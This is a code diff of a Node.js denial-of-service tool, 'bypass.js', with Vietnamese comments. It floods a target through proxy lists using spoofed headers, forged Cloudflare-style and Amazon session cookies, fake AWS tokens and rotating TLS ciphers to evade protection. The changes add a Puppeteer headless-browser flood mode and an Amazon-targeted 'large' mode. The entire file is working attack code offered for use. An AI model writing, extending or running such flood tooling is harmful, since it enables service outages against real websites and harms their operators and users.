@@ -7,6 +7,7 @@ const crypto = require("crypto");
 const fs = require("fs");
 const os = require("os");
 const colors = require("colors");
+const puppeteer = require("puppeteer");
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
@@ -17,7 +18,7 @@ const ciphers = "GREASE:" + [
 ].join(":");
 
 // Các danh sách header, country,... (giữ nguyên từ bạn)
-const accept_header = [ 
+const accept_header = [  
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
   "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -60,7 +61,7 @@ const accept_header = [
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
- ];
+];
 const cache_header = [
     'max-age=0',
     'no-cache',
@@ -73,8 +74,8 @@ const cache_header = [
     'no-cache, no-store,private, max-age=0, must-revalidate',
     'no-cache, no-store,private, s-maxage=604800, must-revalidate',
     'no-cache, no-store,private, max-age=604800, must-revalidate',
-  ]
-const language_header =  [
+    ];
+const language_header = [
     'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
     'en-US,en;q=0.5',
     'en-US,en;q=0.9',
@@ -170,8 +171,8 @@ const language_header =  [
     'yo-NG,yo;q=0.8',
     'zgh-MA,zgh;q=0.8',
     'zu-ZA,zu;q=0.8',
-  ];
-  const refers = [
+    ];
+const refers = [
     "https://www.google.com/",
     "https://challenges.cloudflare.com/cdn-cqi",
     "https://www.facebook.com/",
@@ -294,11 +295,11 @@ const language_header =  [
     "https://www.youtube.com/",
     "https://yandex.ru/",
     "https://nettruyento.com/"
-];
+    ];
 const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
 const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
 const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
-    const cplist = [
+const cplist = [
       "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
       "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
       "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
@@ -361,8 +362,8 @@ const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worke
      'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
       "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
       "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
-    ];
-    const country = [
+      ];
+const country = [
       "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
       "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
       "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
@@ -394,7 +395,7 @@ const args = process.argv.slice(2);
 const flags = args.filter(arg => arg.startsWith('--'));
 const params = args.filter(arg => !arg.startsWith('--'));
 if (params.length < 5) {
-    console.log(`Usage: node bypass.js <host> <time> <req> <thread> <proxy.txt> [--all] [--debug]`.yellow);
+    console.log(`Usage: node bypass.js <host> <time> <req> <thread> <proxy.txt> [--all] [--debug] [--browser] [--large]`.yellow);
     process.exit();
 }
 
@@ -405,6 +406,8 @@ const threads = ~~params[3];
 const proxyfile = params[4];
 const allMode = flags.includes('--all');
 const debugMode = flags.includes('--debug');
+const browserMode = flags.includes('--browser');
+const largeMode = flags.includes('--large');
 
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
 const parsedTarget = url.parse(target);
@@ -417,9 +420,9 @@ const randstr = (length) => {
     for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
     return result;
 };
-const generateRandomCookie = () => `__cf_bm=${randstr(23)}_${randstr(19)}-${Date.now()}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${Date.now()}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${Date.now()}`;
+const generateAmazonCookie = () => `session-id=${randstr(13)}-${randstr(19)}; ubid-main=${randstr(13)}-${randstr(19)}; x-main=${randstr(32)}; at-main=${randstr(64)}; sess-at-main=${randstr(64)}`;
 
-// Hàm bypass Layer 7
+// Hàm bypass Layer 7 cơ bản (HTTP/2)
 function bypassLayer7(target, proxy, rate, duration) {
     const parsedUrl = url.parse(target);
     const [proxyHost, proxyPort] = proxy.split(':');
@@ -427,7 +430,7 @@ function bypassLayer7(target, proxy, rate, duration) {
     const tlsOptions = {
         host: parsedUrl.hostname,
         port: 443,
-        ciphers: randomElement(cplist),
+        ciphers: largeMode && parsedUrl.hostname.includes('amazon') ? "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES256-GCM-SHA384" : randomElement(cplist), // Amazon-specific TLS
         secureProtocol: "TLS_method",
         servername: parsedUrl.hostname,
         rejectUnauthorized: false,
@@ -464,22 +467,25 @@ function bypassLayer7(target, proxy, rate, duration) {
                         for (let i = 0; i < rate; i++) {
                             const headers = {
                                 ':method': 'GET',
-                                ':path': allMode ? `${parsedUrl.path}?${randstr(3)}=${randstr(10)}` : parsedUrl.path,
+                                ':path': largeMode && parsedUrl.hostname.includes('amazon') ? `${parsedUrl.path}/dp/${randstr(10)}?ref_=nav_em_T1_${randstr(5)}` : (allMode || largeMode ? `${parsedUrl.path}?${randstr(3)}=${randstr(10)}` : parsedUrl.path),
                                 ':scheme': 'https',
                                 ':authority': parsedUrl.hostname,
-                                'accept': randomElement(accept_header),
-                                'accept-language': randomElement(language_header),
+                                'accept': largeMode && parsedUrl.hostname.includes('amazon') ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" : randomElement(accept_header),
+                                'accept-language': largeMode && parsedUrl.hostname.includes('amazon') ? "en-US,en;q=0.9" : randomElement(language_header),
                                 'accept-encoding': 'gzip, deflate, br',
                                 'cache-control': randomElement(cache_header),
-                                'referer': randomElement(refers),
-                                'user-agent': `Mozilla/5.0 (${randomElement(country)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.${randstr(4)}.124 Safari/537.36`,
-                                'cookie': allMode ? generateRandomCookie() : undefined,
+                                'referer': largeMode && parsedUrl.hostname.includes('amazon') ? `https://www.amazon.com/s?k=${randstr(5)}` : randomElement(refers),
+                                'user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" : `Mozilla/5.0 (${randomElement(country)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.${randstr(4)}.124 Safari/537.36`,
+                                'cookie': largeMode && parsedUrl.hostname.includes('amazon') ? generateAmazonCookie() : (allMode || largeMode ? generateAmazonCookie() : undefined),
                                 'sec-fetch-site': randomElement(fetch_site),
                                 'sec-fetch-mode': randomElement(fetch_mode),
                                 'sec-fetch-dest': randomElement(fetch_dest),
                                 'upgrade-insecure-requests': '1',
                                 'dnt': '1',
-                                'x-forwarded-for': allMode ? `${randomElement(country)}.${randstr(3)}.${randstr(3)}.${randstr(3)}` : undefined
+                                'x-forwarded-for': allMode || largeMode ? `${randomElement(country)}.${randstr(3)}.${randstr(3)}.${randstr(3)}` : undefined,
+                                'x-amz-user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) amz-sdk-js/3.${randstr(3)}` : undefined, // Amazon-specific
+                                'x-amz-security-token': largeMode && parsedUrl.hostname.includes('amazon') ? randstr(64) : undefined, // Giả lập token AWS
+                                'cloudfront-viewer-country': largeMode && parsedUrl.hostname.includes('amazon') ? randomElement(country) : undefined // CloudFront-specific
                             };
 
                             const stream = client.request(headers);
@@ -491,7 +497,7 @@ function bypassLayer7(target, proxy, rate, duration) {
                             stream.end();
                         }
 
-                        setImmediate(flood); // Flood liên tục
+                        setImmediate(flood);
                     }
 
                     flood();
@@ -514,10 +520,62 @@ function bypassLayer7(target, proxy, rate, duration) {
     });
 }
 
+// Hàm bypass bằng browser (Puppeteer)
+async function browserBypass(target, proxy, rate, duration) {
+    const [proxyHost, proxyPort] = proxy.split(':');
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: [
+            `--proxy-server=${proxyHost}:${proxyPort}`,
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-infobars',
+            '--ignore-certificate-errors',
+            '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ]
+    });
+
+    const endTime = Date.now() + duration * 1000;
+
+    async function floodPage() {
+        if (Date.now() > endTime) {
+            await browser.close();
+            return;
+        }
+
+        const page = await browser.newPage();
+        await page.setRequestInterception(true);
+        page.on('request', (req) => {
+            req.continue({
+                headers: {
+                    'Accept': randomElement(accept_header),
+                    'Accept-Language': randomElement(language_header),
+                    'Referer': randomElement(refers),
+                    'Cookie': generateAmazonCookie()
+                }
+            });
+        });
+
+        try {
+            await page.goto(target, { waitUntil: 'networkidle2', timeout: 60000 });
+            if (debugMode) console.log(`[${proxy}] Browser loaded: ${await page.title()}`.green);
+            if (Math.random() > 0.5) await page.click('body');
+            await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
+        } catch (err) {
+            if (debugMode) console.error(`[${proxy}] Browser Error: ${err.message}`.red);
+        } finally {
+            await page.close();
+            setImmediate(floodPage);
+        }
+    }
+
+    for (let i = 0; i < rate; i++) floodPage();
+}
+
 // Logic chính với cluster
 if (cluster.isMaster) {
     console.clear();
-    console.log(`Starting flood on ${target} for ${time}s with ${threads} threads${allMode ? ' [ALL MODE]' : ''}`.cyan);
+    console.log(`Starting flood on ${target} for ${time}s with ${threads} threads${allMode ? ' [ALL]' : ''}${browserMode ? ' [BROWSER]' : ''}${largeMode ? ' [LARGE]' : ''}`.cyan);
     for (let i = 0; i < threads; i++) cluster.fork();
 
     setTimeout(() => {
@@ -533,8 +591,14 @@ if (cluster.isMaster) {
     for (let i = 0; i < rate; i++) {
         setInterval(() => {
             const proxyChoice = randomElement(proxy);
-            bypassLayer7(target, proxyChoice, rate, time);
-        }, allMode ? 100 : 500); // Tăng tốc độ nếu bật --all
+            if (browserMode) {
+                browserBypass(target, proxyChoice, rate, time).catch(err => {
+                    if (debugMode) console.error(`[${proxyChoice}] Browser Mode Error: ${err.message}`.red);
+                });
+            } else {
+                bypassLayer7(target, proxyChoice, rate, time);
+            }
+        }, allMode || largeMode ? 50 : browserMode ? 1000 : 500);
     }
 }
 
